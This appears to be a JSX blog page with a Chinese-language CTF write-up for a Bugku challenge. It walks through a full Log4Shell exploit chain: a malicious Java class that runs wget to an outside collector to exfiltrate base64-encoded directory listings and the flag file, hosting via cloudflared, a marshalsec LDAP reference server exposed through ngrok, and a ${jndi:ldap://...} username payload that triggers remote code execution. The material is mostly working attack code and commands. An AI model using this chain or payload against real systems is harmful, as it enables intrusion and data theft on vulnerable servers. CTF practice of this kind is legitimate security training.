import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.P>题目连接：@[https://ctf.bugku.com/challenges/detail/id/340.html]@</X.P>
            <X.H1>Step 1</X.H1>
            <X.P>构建恶意类`Exploit.java`：</X.P>
            <X.CodeBlock
                language="java"
                code={String.raw`
                public class Exploit {
                    public Exploit() {
                    }

                    static {
                        try {
                        //  String[] cmds = {"/bin/sh", "-c", "wget -qO- http://vjigzgm3930ko9hia69i0q21us0joec3.oastify.com/?result=$(ls | base64)"};
                            String[] cmds = {"/bin/sh", "-c", "wget -qO- http://vjigzgm3930ko9hia69i0q21us0joec3.oastify.com/?result=$(cat flag | base64)"};
                            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    public static void main(String[] args) {
                        Exploit e = new Exploit();
                    }
                }
                `}
            />
            <X.CodeBlock language="bash" code="javac Exploit.java" />
            <X.P>会生成`Exploit.class`。</X.P>
            <X.HighlightBlock>
                <X.P>需要jdk8编译否则服务端可能无法加载。我的电脑上有多个Java版本，因此使用：</X.P>
                <X.CodeBlock language="bash" code="/usr/libexec/java_home -v 1.8 --exec javac Exploit.java" />
            </X.HighlightBlock>
            <X.H1>Step 2</X.H1>
            <X.P>当前目录下执行：</X.P>
            <X.CodeBlock language="bash" code="python -m http.server 8888" />
            <X.P>内网穿透：</X.P>
            <X.CodeBlock language="bash" code="cloudflared tunnel --url http://localhost:8888" />
            <X.CodeBlock
                language="text"
                code={String.raw`
                +--------------------------------------------------------------------------------------------+
                |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
                |  https://pope-supplemental-notices-greetings.trycloudflare.com                             |
                +--------------------------------------------------------------------------------------------+
                `}
            />
            <X.P>这一步是为了把`Exploit.class`托管出去，LDAP服务器会引用这个URL来加载恶意类。</X.P>
            <X.H1>Step 3</X.H1>
            <X.CodeBlock language="bash" code='java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "https://pope-supplemental-notices-greetings.trycloudflare.com/#Exploit"' />
            <X.CodeBlock language="text" code="Listening on 0.0.0.0:1389" />
            <X.P>内网穿透：</X.P>
            <X.CodeBlock language="bash" code="ngrok tcp 1389" />
            <X.CodeBlock language="text" code="Forwarding  tcp://0.tcp.ap.ngrok.io:10489 -> localhost:1389" />
            <X.H1>Step 4</X.H1>
            <X.P>以用户名{'`${jndi:ldap://0.tcp.ap.ngrok.io:10489/Exploit}`'}登录触发RCE。</X.P>
            <X.CodeBlock
                language="text"
                code={String.raw`
                $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "https://pope-supplemental-notices-greetings.trycloudflare.com/#Exploit"
                Listening on 0.0.0.0:1389
                Send LDAP reference result for Exploit redirecting to https://pope-supplemental-notices-greetings.trycloudflare.com/Exploit.class
                `}
            />
            <X.CodeBlock
                language="text"
                code={String.raw`
                $ python -m http.server 8888
                Serving HTTP on :: port 8888 (http://[::]:8888/) ...
                ::1 - - [22/Nov/2025 22:57:23] "GET /Exploit.class HTTP/1.1" 200 -
                `}
            />
            <X.Image src="1.jpg" width="100%" filterDarkTheme />
        </>
    );
}
